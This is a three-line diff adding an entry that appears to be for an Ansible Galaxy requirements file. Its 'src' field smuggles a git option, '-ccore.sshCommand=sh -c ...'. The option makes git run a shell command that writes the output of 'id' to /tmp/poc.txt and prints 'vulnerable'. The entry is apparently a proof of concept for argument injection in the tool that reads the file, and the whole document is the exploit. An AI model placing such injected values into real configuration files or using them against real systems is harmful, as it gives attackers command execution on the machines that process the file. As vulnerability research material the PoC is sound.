@@ -1,0 +1,3 @@
+- name: git@github.com:dummy/repo.git
+  src: -ccore.sshCommand=sh -c "id > /tmp/poc.txt; echo vulnerable"
+  scm: git
